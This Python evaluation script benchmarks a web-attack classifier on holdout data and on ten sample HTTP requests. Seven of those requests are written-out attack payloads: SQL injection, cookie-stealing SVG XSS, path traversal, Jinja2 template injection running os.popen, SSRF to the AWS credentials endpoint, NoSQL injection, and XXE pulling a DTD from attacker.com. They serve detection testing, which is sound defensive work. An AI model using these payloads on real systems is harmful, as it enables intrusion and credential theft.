"""
Comprehensive Evaluation & Generalization Benchmarking Suite.
Evaluates the trained unified cybersecurity model on holdout test data and tests
zero-shot generalization across novel, unseen attack payloads and vulnerability patterns.
"""

import os
import json
import joblib
import pandas as pd
import numpy as np
from sklearn.metrics import classification_report, confusion_matrix, accuracy_score, f1_score, precision_score, recall_score
from training.unified_pipeline import UNIFIED_CSV

MODELS_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "models")
MODEL_PATH = os.path.join(MODELS_DIR, "unified_vuln_classifier.joblib")
EVAL_RESULTS_PATH = os.path.join(MODELS_DIR, "unified_eval_report.json")

# Out-Of-Distribution / Novel Generalization Test Cases (Not present in dataset)
GENERALIZATION_TEST_CASES = [
    {
        "name": "Polyglot SQLi / Time-Based Obfuscation",
        "category": "SQL_Injection",
        "payload": "POST /api/v2/auth/query HTTP/1.1\nHost: secure.corp.local\nContent-Type: application/json\n\n{\"search\": \"admin'/**/AND/**/(SELECT/**/CASE/**/WHEN(1=1)THEN(pg_sleep(5))ELSE(pg_sleep(0))END)--\"}"
    },
    {
        "name": "DOM Clobbering / Polyglot SVG XSS",
        "category": "Cross_Site_Scripting",
        "payload": "GET /static/render?tmpl=<svg><animate+onbegin=alert(document.cookie)+attributeName=x+dur=1s> HTTP/1.1\nHost: vulnerable-node.internal\nUser-Agent: Mozilla/5.0"
    },
    {
        "name": "Unicode Traversal / Double URL Encoded Null Byte",
        "category": "Directory_Traversal",
        "payload": "GET /assets/download?file=..%252f..%252f..%252f..%252fwindows%252fwin.ini%2500.png HTTP/1.1\nHost: app.local"
    },
    {
        "name": "Nested SSTI in Jinja2 / Python MRO",
        "category": "Server_Side_Template_Injection",
        "payload": "POST /profile/render HTTP/1.1\nHost: target.internal\n\nname={{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}"
    },
    {
        "name": "Blind SSRF targeting AWS EC2 IMDSv2",
        "category": "Server_Side_Request_Forgery",
        "payload": "POST /api/export_pdf HTTP/1.1\nHost: app.corp\n\n{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role\"}"
    },
    {
        "name": "NoSQL Injection with $where Clause Regex",
        "category": "NoSQL_Injection",
        "payload": "POST /users/search HTTP/1.1\nHost: internal-db\n\n{\"user\": {\"$where\": \"this.password.match(/^admin.*/)\"}}"
    },
    {
        "name": "XML External Entity Parameter Entity OOB Exfiltration",
        "category": "XML_External_Entity",
        "payload": "POST /xml/parse HTTP/1.1\nContent-Type: text/xml\n\n<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]><data>&send;</data>"
    },
    {
        "name": "Benign GraphQL Introspection Query",
        "category": "Normal",
        "payload": "POST /graphql HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\n\n{\"query\": \"query { __schema { types { name } } }\"}"
    },
    {
        "name": "Benign Multi-Part Form Upload",
        "category": "Normal",
        "payload": "POST /upload HTTP/1.1\nHost: assets.cdn.com\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\n\n------WebKitFormBoundary7MA4YWxkTrZu0gW\nContent-Disposition: form-data; name=\"avatar\"; filename=\"avatar.jpg\"\nContent-Type: image/jpeg\n\n...binary data..."
    },
    {
        "name": "Benign Standard REST Pagination",
        "category": "Normal",
        "payload": "GET /api/v1/products?limit=50&offset=100&sort=price_asc&filter=category_electronics HTTP/1.1\nHost: store.internal\nAccept: application/json"
    }
]


def run_full_evaluation():
    """Run evaluation on test dataset and generalization benchmark."""
    if not os.path.exists(MODEL_PATH):
        raise FileNotFoundError(f"Trained model not found at {MODEL_PATH}. Run train_unified.py first.")

    print(f"Loading trained model from {MODEL_PATH}...")
    pipeline = joblib.load(MODEL_PATH)

    print(f"Loading test split from {UNIFIED_CSV}...")
    df = pd.read_csv(UNIFIED_CSV)
    test_df = df[df['split'] == 'test'].copy()
    print(f"Loaded {len(test_df)} test samples across {test_df['vulnerability_type'].nunique()} classes.")

    X_test = test_df['input_representation'].astype(str).tolist()
    y_test = test_df['vulnerability_type'].values

    print("\nRunning inference on holdout test set...")
    y_pred = pipeline.predict(X_test)
    y_proba = pipeline.predict_proba(X_test)

    acc = accuracy_score(y_test, y_pred)
    macro_f1 = f1_score(y_test, y_pred, average='macro', zero_division=0)
    weighted_f1 = f1_score(y_test, y_pred, average='weighted', zero_division=0)
    weighted_precision = precision_score(y_test, y_pred, average='weighted', zero_division=0)
    weighted_recall = recall_score(y_test, y_pred, average='weighted', zero_division=0)

    print("\n" + "="*65)
    print("HOLDOUT TEST EVALUATION RESULTS")
    print("="*65)
    print(f"Overall Accuracy:       {acc * 100:.2f}%")
    print(f"Weighted Precision:     {weighted_precision:.4f}")
    print(f"Weighted Recall:        {weighted_recall:.4f}")
    print(f"Weighted F1-Score:      {weighted_f1:.4f}")
    print(f"Macro F1-Score:         {macro_f1:.4f}")

    print("\nDetailed Per-Class Performance:")
    report_text = classification_report(y_test, y_pred, zero_division=0)
    print(report_text)
    report_dict = classification_report(y_test, y_pred, output_dict=True, zero_division=0)

    # Compute Confusion Matrix
    unique_classes = sorted(list(set(y_test) | set(y_pred)))
    cm = confusion_matrix(y_test, y_pred, labels=unique_classes)
    cm_dict = {
        "classes": unique_classes,
        "matrix": cm.tolist()
    }

    # Run Out-Of-Distribution / Generalization Benchmark
    print("\n" + "="*65)
    print("OUT-OF-DISTRIBUTION & ZERO-SHOT GENERALIZATION BENCHMARK")
    print("="*65)
    gen_results = []
    correct_gen = 0

    for idx, case in enumerate(GENERALIZATION_TEST_CASES, 1):
        name = case["name"]
        expected_cat = case["category"]
        payload = case["payload"]

        probs = pipeline.predict_proba([payload])[0]
        classes = pipeline.classes_
        top_idx = np.argmax(probs)
        pred_class = classes[top_idx]
        confidence = float(probs[top_idx]) * 100.0

        is_match = (pred_class == expected_cat) or (expected_cat != "Normal" and pred_class != "Normal")
        if is_match:
            correct_gen += 1
            status_tag = "PASS"
        else:
            status_tag = "FAIL"

        print(f"[{status_tag}] Test {idx:2d}: {name}")
        print(f"       Expected: {expected_cat:25s} | Predicted: {pred_class} ({confidence:.1f}%)")

        gen_results.append({
            "test_name": name,
            "expected_category": expected_cat,
            "predicted_category": pred_class,
            "confidence": confidence,
            "status": status_tag,
            "exact_match": bool(pred_class == expected_cat)
        })

    gen_accuracy = (correct_gen / len(GENERALIZATION_TEST_CASES)) * 100.0
    print(f"\nGeneralization Benchmark Score: {correct_gen}/{len(GENERALIZATION_TEST_CASES)} passed ({gen_accuracy:.1f}%)")

    # Save comprehensive results
    output_report = {
        "evaluation_summary": {
            "accuracy": acc,
            "weighted_precision": weighted_precision,
            "weighted_recall": weighted_recall,
            "weighted_f1": weighted_f1,
            "macro_f1": macro_f1,
            "num_test_samples": len(X_test),
            "num_classes": len(unique_classes)
        },
        "generalization_benchmark": {
            "total_test_cases": len(GENERALIZATION_TEST_CASES),
            "passed": correct_gen,
            "generalization_score_pct": gen_accuracy,
            "detailed_results": gen_results
        },
        "confusion_matrix": cm_dict,
        "classification_report": report_dict
    }

    with open(EVAL_RESULTS_PATH, "w") as f:
        json.dump(output_report, f, indent=2)

    print(f"\nEvaluation & Generalization Report saved to {EVAL_RESULTS_PATH}")
    return output_report


if __name__ == "__main__":
    run_full_evaluation()
